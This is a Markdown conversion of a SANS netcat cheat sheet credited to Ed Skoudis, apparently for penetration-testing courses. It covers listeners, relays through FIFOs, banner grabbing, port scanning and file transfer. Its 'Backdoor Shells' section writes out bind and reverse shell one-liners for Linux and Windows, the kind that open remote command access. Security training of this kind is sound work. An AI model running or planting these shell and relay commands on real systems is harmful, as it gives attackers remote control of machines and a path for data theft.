# 🧪 Netcat Cheat Sheet

**Author**: Ed Skoudis  
**Source**: SANS Pocket Reference Guide  
**Use Cases**: Tailored to SANS 504, 517, 560

---

## 🚀 Netcat Command Syntax

```bash
$ nc [options] [TargetIPaddr] [port(s)]
```

- `TargetIPaddr`: IP or domain name (required in client mode, optional in listen mode)

### Common Options

| Option | Description |
|--------|-------------|
| `-l`   | Listen mode |
| `-L`   | Persistent listen (Windows only) |
| `-u`   | Use UDP instead of TCP |
| `-p`   | Specify local port |
| `-e`   | Execute program on connection |
| `-n`   | No DNS resolution |
| `-z`   | Zero-I/O (port scanning) |
| `-wN`  | Timeout in seconds |
| `-v`   | Verbose |
| `-vv`  | Very verbose |

---

## 📦 Netcat Fundamentals

**Client:**
```bash
$ nc [TargetIPaddr] [port]
```

**Listener:**
```bash
$ nc -l -p [LocalPort]
```

---

## 🔁 Netcat Relays (Windows)

**Listener-to-Client Relay:**
```cmd
C:\> echo nc [TargetIP] [port] > relay.bat
C:\> nc -l -p [LocalPort] -e relay.bat
```

**Listener-to-Listener Relay:**
```cmd
C:\> echo nc -l -p [Port2] > relay.bat
C:\> nc -l -p [Port1] -e relay.bat
```

**Client-to-Client Relay:**
```cmd
C:\> echo nc [NextHopIP] [port2] > relay.bat
C:\> nc [PrevHopIP] [port1] -e relay.bat
```

---

## 🔁 Netcat Relays (Linux)

### Create FIFO
```bash
$ cd /tmp
$ mknod backpipe p
```

**Listener-to-Client Relay:**
```bash
$ nc -l -p [LocalPort] 0<backpipe | nc [TargetIP] [port] | tee backpipe
```

**Listener-to-Listener Relay:**
```bash
$ nc -l -p [Port1] 0<backpipe | nc -l -p [Port2] | tee backpipe
```

**Client-to-Client Relay:**
```bash
$ nc [PrevHopIP] [port1] 0<backpipe | nc [NextHopIP] [port2] | tee backpipe
```

---

## 💻 TCP Banner Grabbing

```bash
$ echo "" | nc -v -n -w1 [TargetIP] [start_port]-[end_port]
```

Optional:
- `-r`: Randomize destination ports
- `-p [port]`: Source port

---

## 🛠️ Backdoor Shells

**Listening Backdoor Shell (Linux):**
```bash
$ nc -l -p [LocalPort] -e /bin/bash
```

**Listening Backdoor Shell (Windows):**
```cmd
C:\> nc -l -p [LocalPort] -e cmd.exe
```

**Reverse Shell (Linux):**
```bash
$ nc [YourIP] [port] -e /bin/bash
```

**Reverse Shell (Windows):**
```cmd
C:\> nc [YourIP] [port] -e cmd.exe
```

---

## 📁 File Transfers

**Send File (client to listener):**
```bash
Listener: $ nc -l -p [LocalPort] > [outfile]
Sender:   $ nc -w3 [TargetIP] [port] < [infile]
```

**Retrieve File (listener to client):**
```bash
Listener: $ nc -l -p [LocalPort] < [infile]
Client:   $ nc -w3 [TargetIP] [port] > [outfile]
```

---

## �� TCP Port Scanner

```bash
$ nc -v -n -z -w1 [TargetIP] [start_port]-[end_port]
```

Optional:
- `-r`: Randomize ports

---

**Converted by: Christen Reinhart**  
**Source: SANS Netcat Cheat Sheet (Ed Skoudis)**  
